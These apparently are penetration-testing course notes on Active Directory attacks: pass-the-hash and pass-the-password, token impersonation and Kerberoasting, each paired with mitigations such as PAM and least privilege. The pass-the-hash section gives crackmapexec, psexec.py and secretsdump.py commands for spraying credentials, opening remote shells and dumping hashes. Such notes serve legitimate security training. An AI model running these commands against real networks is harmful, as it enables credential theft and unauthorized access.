

### Pass the Hash / Pass the Password

```
sudo apt install crackmapexec 

crackmapexec <IP/CIDR> -u <user> -d <domain> -p <password> 

crackmapexec smb <IP/CIDR> -u <user> -H <hash> --local-auth
```


```
psexec.py marvel/fcastle:Password1@<IP>

secretsdump.py marvel/fcastle:Password1@<IP>

psexec.py "frank castle":@<IP> -hashes LMHASH:LTHASH
```

---

### Pass attacke mitigations

Hard to completely prevent, but we can make it more difficult on an attacker:
- Limit account re-use:
  - Avoid re-using local admin password
  - Disable Guest and Administrator accounts
  - Limit who is a local administrator (least privilege)
- Utilize strong passwords:
  - The longer the better (>14 characters)
  - Avoid using common words
  - I like long sentences
- Privilege Access Management (PAM)
  - Check out/in sensitive accounts when needed
  - Automatically rotate passwords on check out and check in
  - Limits pass attacks as hash/password is strong and constantly rotated

---

### Token Impersonation

What are tokens?
- Temporary keys that allow you access to a system/network without having to provide credentials each time you access a file. Think cookies for computers.

Two types:
- Delegate - Created for logging into a machine or using Remote Desktop
- Impersonate - "non-interactive" such as attaching a network drive or a domain logon script

https://www.offensive-security.com/metasploit-unleashed/fun-incognito/

### Token Impersonation Mitigation

Mitigation Strategies:
- Limit user/group token creation permissions
- Account tiering
- Local admin restriction

---

### Kerberoasting 

https://medium.com/@Shorty420/kerberoasting-9108477279cc







